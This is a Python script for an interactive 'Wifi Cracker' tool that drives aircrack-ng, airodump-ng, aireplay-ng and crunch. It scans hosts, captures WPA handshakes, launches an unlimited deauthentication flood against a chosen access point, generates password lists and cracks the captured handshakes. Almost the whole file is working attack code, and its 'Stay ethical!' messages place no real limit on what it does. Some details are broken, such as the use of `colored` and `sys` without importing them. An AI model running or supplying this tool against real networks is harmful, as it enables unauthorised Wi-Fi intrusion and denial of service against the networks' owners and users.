import subprocess
from GenCharlist import *
from pyfiglet import Figlet
from colorama import Fore, Style, init as colorama_init
from mac_address_detector import *
import getpass
import time
import os
import random
colorama_init(autoreset=True)

class Animation:
    @staticmethod

    def animated_banner(text: str, frames: int = 15, delay: float = 0.08):
        f = Figlet(font="big")
        base = f.renderText(text)
        lines = base.splitlines()
        width = max(len(l) for l in lines)

        # Fire colors to pick from
        fire_colors = ["red", "yellow", "magenta"]

        for i in range(frames):
            pad = " " * (i % (width // 4 + 1))
            
            frame_lines = []
            for line in lines:
                color = random.choice(fire_colors)
                frame_lines.append(colored(pad + line, color))
            
            print("\n".join(frame_lines))
            time.sleep(delay)

            if i != frames - 1:
                print(f"\033[{len(lines)}F", end="")



class Attack:
    def __init__(self, mac, iface, capture_file, wordlist, iface_mon, channel, band):
        """
        mac          -> Target AP MAC address
        iface        -> Main network interface (e.g. wlan0)
        capture_file -> Base name for captured handshake files (e.g. "hack0")
        wordlist     -> Path to password list file
        iface_mon    -> Monitor mode interface (e.g. wlan0mon)
        channel      -> Wi-Fi channel number (string)
        band         -> Wi-Fi band (e.g. "abg")
        """
        self.mac = mac
        self.iface = iface
        self.capture_file = capture_file
        self.wordlist = wordlist
        self.iface_mon = iface_mon
        self.channel = channel
        self.band = band


    def list_targets(self, ip_range, search_mac=None, only=False):
        while True:
            print(Fore.BLUE + f"🔍 Scanning network: {ip_range} ...")
            scan_output = scan_network(ip_range)
            mac_data = find_mac_and_state(scan_output)

            if not mac_data:
                print(Fore.RED + "[!] No hosts detected. Retrying in 5 seconds...")
                time.sleep(5)
                continue

            found = False
            if search_mac:
                for ip, (mac, state, dev_type) in mac_data.items():
                    if mac.lower() == search_mac.lower():
                        color_state = colored(state, 'green' if 'up' in state.lower() else 'red')
                        print(f"{ip:<20}{mac:<20}{color_state:<20}{dev_type}")
                        found = True
                        if only:
                            return mac_data
                if not found:
                    print(Fore.YELLOW + f"[!] MAC {search_mac} not found. Retrying in 5 seconds...")
                    time.sleep(5)
                    continue
            else:
                print(f"{'IP Address':<20}{'MAC Address':<20}{'State':<20}{'Device Type'}")
                print("-" * 70)
                for ip, (mac, state, dev_type) in mac_data.items():
                    color_state = colored(state, 'green' if 'up' in state.lower() else 'red')
                    print(f"{ip:<20}{mac:<20}{color_state:<20}{dev_type}")
                return mac_data

    def kill_conflicting_processes(self):
        print("[*] Killing interfering processes...")
        subprocess.run(["airmon-ng", "check", "kill"])
        time.sleep(2)

    def find_channel(self):
        self.kill_conflicting_processes()
        command = f"airmon-ng start {self.iface} && airodump-ng {self.iface} -d {self.mac} --band {self.band}; echo 'Press Enter to exit...'; read"
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command])

    def cap_handshake(self):
        command = f"airodump-ng {self.iface_mon} -d {self.mac} -c {self.channel} -w {self.capture_file}; echo 'Press Enter to exit...'; read"
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command])

    def dos(self):
        command = f"aireplay-ng --deauth 0 -a {self.mac} {self.iface_mon}; echo 'Press Enter to exit...'; read"
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command])

    def crack(self):
        if not self.wordlist:
            print("[!] Error: Please specify a dictionary file (-w).")
            return
        if not self.mac:
            print("[!] Error: MAC address (-b) is missing.")
            return

        # Only consider .cap files matching the capture_file base
        cap_files = [f for f in os.listdir() if f.startswith(self.capture_file) and f.endswith(".cap")]
        if not cap_files:
            print(f"[!] Error: No .cap capture files found for base '{self.capture_file}'.")
            return

        # Optionally pick the latest capture
        cap_files.sort()
        cap_file = cap_files[-1]  # latest capture
        print(f"[+] Using capture file: {cap_file}")

        command = f"aircrack-ng -w {self.wordlist} -b {self.mac} {cap_file}; echo 'Press Enter to exit...'; read"
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command])

        
    def generate_pass(self, monster, filepasswords):
        self.monster = monster
        self.filepasswords = filepasswords
        subprocess.run(['crunch', '10', '10', '-t', self.monster, '-o', self.filepasswords])
        
    def restart_nm(self):
        subprocess.run(['systemctl', 'restart', 'NetworkManager'])

    def find_info_about_ap(self):
        command_str = 'nmcli -f SSID,CHAN,BSSID dev wifi'
        subprocess.run(command_str,shell=True)
    def channeloriented(self):
        self.channel = input('choose the channel that you see:')
        command_str = f'airodump-ng {self.iface_mon} -d {self.mac} -c {self.channel}'
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command_str])
    def wireshark_EAPOL(self):
        cap_files = [f for f in os.listdir() if f.startswith(self.capture_file) and f.endswith(".cap")]
        if not cap_files:
            print(Fore.RED + f"[!] No .cap files found for base '{self.capture_file}'. Cannot open Wireshark.")
            return

        cap_files.sort()
        cap_file = cap_files[-1]  # latest capture
        print(Fore.GREEN + f"[+] Opening Wireshark for: {cap_file}")

        command_str = f'wireshark "{cap_file}" -Y "eapol"; echo "Press Enter to exit..."; read'
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command_str])
        

    @staticmethod
    def menu():
        print(Fore.MAGENTA + Style.BRIGHT + "\n=== Welcome to the Attack Menu ===" + Style.RESET_ALL)
        print(Fore.CYAN + " 00 " + Fore.WHITE + "- " + Fore.YELLOW + "Find info about AP (run this first)")
        print(Fore.CYAN + "  1 " + Fore.WHITE + "- " + Fore.YELLOW + "Find Channel (run this second)")
        print(Fore.CYAN + "  2 " + Fore.WHITE + "- " + Fore.YELLOW + "Capture Handshake")
        print(Fore.CYAN + "  3 " + Fore.WHITE + "- " + Fore.YELLOW + "Denial of Service (DoS)")
        print(Fore.CYAN + "  4 " + Fore.WHITE + "- " + Fore.YELLOW + "Crack Handshake")
        print(Fore.CYAN + "  5 " + Fore.WHITE + "- " + Fore.YELLOW + "Generate Password List")
        print(Fore.CYAN + "  6 " + Fore.WHITE + "- " + Fore.YELLOW + "Restart Network Manager (ensure this is up before executing 00)")
        print(Fore.CYAN + "001 " + Fore.WHITE + "- " + Fore.YELLOW + "See EAPOL in Wireshark")
        print(Fore.CYAN + "  0 " + Fore.WHITE + "- " + Fore.RED + Style.BRIGHT + "Exit" + Style.RESET_ALL)
        
        choice = input(Fore.GREEN + Style.BRIGHT + "\n👉 Enter your choice: " + Style.RESET_ALL).strip()
        return choice


def main():
    try:
        # --- Initial Setup ---
        iface = input(Fore.CYAN + "📡 Enter your interface (e.g. wlan0): " + Style.RESET_ALL).strip()
        if not iface:
            iface = "wlan0"
            print(Fore.YELLOW + f"⚠ No interface entered. Using default: {iface}")
        iface_mon = iface

        capture_file = input(Fore.CYAN + "💾 Enter capture filename base (e.g hack0): " + Style.RESET_ALL).strip()
        if not capture_file:
            capture_file = "hack0"
            print(Fore.YELLOW + f"⚠ No filename entered. Using default: {capture_file}")

        attack = Attack(mac="", iface=iface, capture_file=capture_file, wordlist="", iface_mon=iface_mon, channel="", band="")

        # --- List network targets ---
        print(Fore.BLUE + "📡 Listing network targets...")
        while True:
            ip_range = input(Fore.CYAN + "🌐 Enter IP range (e.g., 192.168.1.1-20): " + Style.RESET_ALL).strip()
            if not ip_range:
                ip_range = "192.168.1.1-20"
                print(Fore.YELLOW + f"⚠ No IP range entered. Using default: {ip_range}")

            search_mac = input(Fore.CYAN + "🔎 (Optional) Enter MAC to search for or press Enter to skip: " + Style.RESET_ALL).strip()
            only = False
            if search_mac:
                only_input = input(Fore.CYAN + "Show only matching device? (y/n): " + Style.RESET_ALL).strip().lower()
                only = only_input == "y"

            hosts = attack.list_targets(ip_range, search_mac if search_mac else None, only)
            if hosts:
                print(Fore.GREEN + f"[+] Hosts found: {len(hosts)}")
                break
            else:
                print(Fore.RED + "❌ No hosts found. Please try again.")

        # --- Continue Setup for Wi-Fi Attack ---
        mac = input(Fore.CYAN + "🔗 Enter target MAC address (ESSID) (e.g: xx:xx:xx:xx:xx:xx): " + Style.RESET_ALL).strip()
        if not mac:
            mac = "00:00:00:00:00:00"
            print(Fore.YELLOW + f"⚠ No MAC entered. Using placeholder: {mac}")

        # Wordlist handling
        choice = input(Fore.BLUE + "📂 Do you have a wordlist? Type 'yes' or press Enter to auto-generate: " + Style.RESET_ALL).strip().lower()
        if choice == "yes":
            wordlist = input(Fore.CYAN + "📄 Enter path to wordlist: " + Style.RESET_ALL).strip()
            if not wordlist or not os.path.exists(wordlist):
                print(Fore.RED + f"❌ File '{wordlist}' not found. Generating a default wordlist.")
                choice = ""  # fallback to auto-generate
        if choice != "yes":
            print(Fore.YELLOW + "⚠ No wordlist provided. Generating one using your input...")
            base_word = getpass.getpass(Fore.CYAN + "🔑 Enter part of the password to add random specials: " + Style.RESET_ALL).strip()
            if not base_word:
                base_word = "password"
                print(Fore.YELLOW + f"⚠ No input provided. Using default base word: {base_word}")
            wordlist = "generated_password.txt"
            generate_password(base_word, wordlist)
            print(Fore.GREEN + f"✅ Password list generated: {wordlist}")

        # Update attack object with real MAC and wordlist
        attack.mac = mac
        attack.wordlist = wordlist

        channel = ''
        band = ''

        # --- Attack Menu Loop ---
        while True:
            choice = Attack.menu()

            if choice == "00":
                print(Fore.BLUE + "📡 Scanning for access points...")
                attack.find_info_about_ap()
                attack.mac = input(Fore.CYAN + "🔗 Enter AP MAC address from step 00 or the router's BSSID: " + Style.RESET_ALL).strip()
                if not attack.mac:
                    print(Fore.YELLOW + "⚠ No MAC entered. Skipping update.")

            elif choice == "1":
                band = input(Fore.CYAN + "📶 Enter band (like 'a', 'ab', 'abg') or press Enter for default ('abg'): " + Style.RESET_ALL).strip()
                if not band:
                    band = 'abg'
                    print(Fore.YELLOW + f"⚠ No band entered. Using default: {band}")
                attack.band = band
                print(Fore.YELLOW + "⏳ Press CTRL + C to stop channel scanning.")
                attack.find_channel()
                input(Fore.CYAN + "Press Enter to proceed..." + Style.RESET_ALL)
                attack.channeloriented()

            elif choice == "2":
                channel = input(Fore.CYAN + "📡 Enter the channel number: " + Style.RESET_ALL).strip()
                if not channel:
                    print(Fore.YELLOW + "⚠ No channel entered. Skipping handshake capture.")
                    continue
                attack.channel = channel
                attack.cap_handshake()

            elif choice == "3":
                attack.iface_mon = iface_mon
                print(Fore.RED + "⚠ Launching deauthentication attack (simulation/lab only!)")
                attack.dos()

            elif choice == "4":
                cap_file_path = f"{attack.capture_file}-01.cap"
                if os.path.exists(cap_file_path):
                    print(Fore.GREEN + f"✅ Capture file found: {cap_file_path}")
                    attack.crack()
                else:
                    print(Fore.RED + f"❌ Capture file '{cap_file_path}' not found. Cannot crack yet.")

            elif choice == "5":
                monster = input(Fore.CYAN + "🔢 Enter pattern for password generation (e.g., abc%%%%%%): " + Style.RESET_ALL).strip()
                if not monster:
                    monster = "abc%%%%%%"
                    print(Fore.YELLOW + f"⚠ No pattern entered. Using default: {monster}")
                filepasswords = input(Fore.CYAN + "💾 Enter output file for passwords: " + Style.RESET_ALL).strip()
                if not filepasswords:
                    filepasswords = "generated_passwords.txt"
                    print(Fore.YELLOW + f"⚠ No filename entered. Using default: {filepasswords}")
                attack.generate_pass(monster, filepasswords)
                print(Fore.GREEN + f"✅ Passwords generated and saved to {filepasswords}")

            elif choice == "001":
                print(Fore.BLUE + "🔍 Opening Wireshark to inspect EAPOL packets...")
                attack.wireshark_EAPOL()

            elif choice == "6":
                print(Fore.CYAN + "♻ Restarting Network Manager...")
                attack.restart_nm()
                time.sleep(2)
                print(Fore.GREEN + "✅ Network Manager restarted successfully.")

            elif choice == "0":
                print(Fore.MAGENTA + "👋 Exiting... Stay ethical!")
                break

            else:
                print(Fore.RED + "❌ Invalid choice, please try again.")

    except KeyboardInterrupt:
        print(Fore.MAGENTA + "\n👋 Exiting gracefully (CTRL+C pressed). Stay ethical!")
        sys.exit(0)

if __name__ == "__main__":
    Animation.animated_banner("Wifi Cracker", frames=8, delay=0.07)
    print(colored("By cyb2rS2c", "blue"),'\n')
    main()

